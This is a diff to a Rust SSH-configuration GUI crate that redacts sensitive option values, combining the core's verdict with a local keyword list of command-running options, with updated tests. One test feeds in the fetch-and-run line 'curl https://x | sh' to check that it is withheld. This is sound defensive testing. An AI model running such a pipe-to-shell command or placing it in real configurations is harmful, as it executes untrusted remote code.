@@ -161,9 +161,9 @@ pub(crate) struct EffectiveOptionDto {
     pub sensitive: bool,
 }
 
-/// Keywords whose values are withheld (same list as the core's
-/// `EffectiveOption::sensitive`, checked here too so the GUI never relies
-/// on a field it cannot see in older cores).
+/// Keywords whose values are withheld. The core decides
+/// (`EffectiveOption::sensitive`); this list is a second check, so a value
+/// only reaches the webview if both agree it is harmless.
 const SENSITIVE_KEYS: [&str; 4] = [
     "proxycommand",
     "localcommand",
@@ -199,10 +199,14 @@ fn file_line(file: &str, line: usize) -> String {
     )
 }
 
-/// Built from the fields (not the core struct) so the core can add fields
-/// to `EffectiveOption` without breaking this crate.
-fn option_dto(key: &str, values: &[String], origin: &OptionOrigin) -> EffectiveOptionDto {
-    let sensitive = is_sensitive(key);
+/// `core_sensitive` is the core's verdict; the local list can only add to it.
+fn option_dto(
+    key: &str,
+    values: &[String],
+    origin: &OptionOrigin,
+    core_sensitive: bool,
+) -> EffectiveOptionDto {
+    let sensitive = core_sensitive || is_sensitive(key);
     EffectiveOptionDto {
         key: escape_display(key, DISPLAY_SHORT),
         values: if sensitive {
@@ -236,7 +240,7 @@ impl From<&EffectiveConfig> for EffectiveConfigDto {
             options: c
                 .options
                 .iter()
-                .map(|o| option_dto(&o.key, &o.values, &o.origin))
+                .map(|o| option_dto(&o.key, &o.values, &o.origin, o.sensitive))
                 .collect(),
             route: c
                 .route
@@ -351,14 +355,21 @@ mod tests {
             "identityfile",
             &["~/.ssh/id\u{202e}gpj".into()],
             &config_origin(3),
+            false,
         );
         assert_eq!(first.values, ["~/.ssh/id\\u{202e}gpj"]);
         assert!(!first.sensitive);
         assert!(!first.command);
         assert_eq!(first.origin.as_deref(), Some("/etc/ssh/ssh_config:3"));
-        let default = option_dto("port", &["22".into()], &OptionOrigin::Default);
+        let default = option_dto("port", &["22".into()], &OptionOrigin::Default, false);
         assert_eq!(default.origin, None);
-        assert!(option_dto("user", &["root".into()], &OptionOrigin::Command).command);
+        assert!(option_dto("user", &["root".into()], &OptionOrigin::Command, false).command);
+        // The core's verdict is enough on its own.
+        assert!(
+            option_dto("setenv", &["A=b".into()], &OptionOrigin::Default, true)
+                .values
+                .is_empty()
+        );
         let warning = warning_dto("/etc/ssh/ssh_config", 9, "unsupported Match\u{1b}");
         assert_eq!(warning.origin, "/etc/ssh/ssh_config:9");
         assert_eq!(warning.message, "unsupported Match\\u{1b}");
@@ -372,7 +383,12 @@ mod tests {
             "remotecommand",
             "knownhostscommand",
         ] {
-            let option = option_dto(key, &["curl https://x | sh".into()], &config_origin(1));
+            let option = option_dto(
+                key,
+                &["curl https://x | sh".into()],
+                &config_origin(1),
+                false,
+            );
             assert!(option.sensitive, "{key}");
             assert!(option.values.is_empty(), "{key}");
             assert!(!serde_json::to_string(&option).unwrap().contains("curl"));
